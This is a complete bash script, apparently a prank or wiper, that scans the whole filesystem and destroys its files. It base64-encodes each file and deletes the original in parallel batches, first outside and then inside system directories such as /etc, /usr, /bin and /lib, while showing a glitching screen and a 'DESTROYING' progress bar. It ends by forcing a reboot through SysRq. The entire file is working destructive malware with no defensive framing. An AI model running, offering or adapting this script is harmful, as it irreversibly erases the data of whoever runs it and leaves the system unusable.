#!/bin/bash

# --- VITAL SIGN PROTECTION ---
# We protect the tools needed for the visuals and the script's logic
PROTECTED="base64|rm|sh|sleep|ld-linux|libc.so|libdl.so|grep|wc|find|xargs|printf|seq|bash|head|libtinfo|tput"
MAJOR_DIRS="/etc|/bin|/sbin|/lib|/usr|/boot"

# --- THE GLITCH ENGINE ---
glitch_screen() {
    while true; do
        # Random tearing
        ROW=$((RANDOM % 30))
        COL=$((RANDOM % $(tput cols 2>/dev/null || echo 80)))
        echo -e "\e[${ROW};${COL}H\e[1;$(($RANDOM%7+31))m$(head -c 15 /dev/urandom 2>/dev/null | base64 | head -c 20)"
        
        # Jitter effect
        [[ $((RANDOM % 8)) -eq 0 ]] && echo -n -e "\e[?5h" && sleep 0.01 && echo -n -e "\e[?5l"
        sleep 0.05
    done
}

clear
echo -e "\e[1;31m[!] CALCULATING FILESYSTEM ENTROPY...\e[0m"

# 1. REAL PERCENTAGE SETUP
# We prune /proc, /sys, and /dev to avoid the "No such file" errors and speed up the count
TOTAL_FILES=$(find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f -print 2>/dev/null | wc -l)
PROGRESS_TRACKER="/tmp/shred_count"
echo 0 > "$PROGRESS_TRACKER"

echo -e "\e[1;33m[!] TARGETING $TOTAL_FILES FILES. COMMENCING DESTRUCTION.\e[0m"
sleep 1.5

glitch_screen &
GLITCH_PID=$!

# 2. THE HIGH-SPEED BATCH ENGINE
destroy_batch() {
    for FILE in "$@"; do
        if base64 "$FILE" > "${FILE}.b64" 2>/dev/null && rm "$FILE" 2>/dev/null; then
             echo 1 >> "$PROGRESS_TRACKER"
        else
            rm -f "$FILE" 2>/dev/null && echo 1 >> "$PROGRESS_TRACKER"
        fi
    done
}
export -f destroy_batch
export PROGRESS_TRACKER

# Launch Destruction
(
  # Phase 1: Everything safe
  find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -regextype posix-extended -not -regex ".*($MAJOR_DIRS|$PROTECTED).*" -type f -print0 2>/dev/null | \
  xargs -0 -P $(nproc) -n 25 bash -c 'destroy_batch "$@"' _
  
  # Phase 2: The Core
  find /etc /usr /bin /lib -regextype posix-extended -not -regex ".*($PROTECTED).*" -type f -print0 2>/dev/null | \
  xargs -0 -P $(nproc) -n 25 bash -c 'destroy_batch "$@"' _
) &

# 3. THE LOCKED HUD
while true; do
    # Fallback to prevent divide by zero if count fails
    CURRENT_COUNT=$(wc -l < "$PROGRESS_TRACKER" 2>/dev/null || echo 0)
    [[ $TOTAL_FILES -eq 0 ]] && TOTAL_FILES=1
    PERCENT=$(( 100 * CURRENT_COUNT / TOTAL_FILES ))
    
    [[ $PERCENT -gt 100 ]] && PERCENT=100

    filled=$(( PERCENT / 2 ))
    empty=$(( 50 - filled ))
    
    # Stay at the bottom of the screen
    printf "\e[s\e[99;0H\e[1;31m[ DESTROYING ]: [%-50s] %d%% (%d/%d)\e[u" "$(printf '#%.0s' $(seq 1 $filled 2>/dev/null))" "$PERCENT" "$CURRENT_COUNT" "$TOTAL_FILES"
    
    if [ "$PERCENT" -ge 100 ]; then break; fi
    sleep 0.1
done

# --- THE FINAL COLLAPSE ---
kill -9 $GLITCH_PID >/dev/null 2>&1
clear
echo -e "\e[1;31m\n\n     SYSTEM ERASED. REBOOTING...     \n\n\e[0m"
sleep 2

# Final attempt to force reboot via SysRq
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo b > /proc/sysrq_trigger 2>/dev/null
reboot -f
